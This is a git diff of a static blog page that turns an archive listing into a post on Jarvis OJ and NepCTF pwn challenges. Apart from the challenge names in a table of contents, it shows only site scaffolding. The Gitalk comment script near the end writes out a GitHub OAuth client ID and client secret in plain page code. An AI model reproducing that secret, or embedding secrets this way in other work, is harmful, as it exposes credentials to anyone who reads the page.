-      <a class="archive-article-title" href="/2020/12/05/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">信安实验室 第二周 学习报告</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">学习总结</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Jarvis OJ</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">nepctf</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://qingmu-z.github.io/2021/03/26/jarvisoj/pwn/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/12/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20reverse%20%E7%AC%AC%E4%BA%8C%E5%91%A8/" class="archive-article-date">
-  	<time datetime="2020-11-30T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-01</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2021/03/12/buu/buu%20pwn2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">buuctf pwn（2）</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/12/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20reverse%20%E7%AC%AC%E4%BA%8C%E5%91%A8/">攻防世界 reverse 第二周</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">攻防世界</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#level1"><span class="toc-number">1.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level3"><span class="toc-number">2.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level3-x64"><span class="toc-number">3.</span> <span class="toc-text">level3_x64</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smashes"><span class="toc-number">4.</span> <span class="toc-text">smashes</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easystack%EF%BC%88nepctf%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">easystack（nepctf）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0-%E9%80%81%E4%BD%A0%E4%B8%80%E6%9C%B5%E5%B0%8F%E7%BA%A2%E8%8A%B1-nepctf"><span class="toc-number">6.</span> <span class="toc-text">[签到] 送你一朵小红花 (nepctf)</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
   
-    </div></section>
   
 
-    
+  
+
+
+	<div id="gitalk-container"></div>
+	<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script type="text/javascript">
+    new Gitalk({
+        clientID: '33931d9e122463275cdd',
+        clientSecret: 'd5606411ea5f6bfd13d4a1603a38dc4f77046949',
+        repo: 'qingmu-z.github.io',
+        owner: 'qingmu-z',
+        admin: 'qingmu-z',
+        id: md5(location.pathname),
+        distractionFreeMode: true
+    }).render('gitalk-container')
+</script>
+
+
+  
+
+
+  
 
 
           </div>
@@ -536,8 +540,8 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
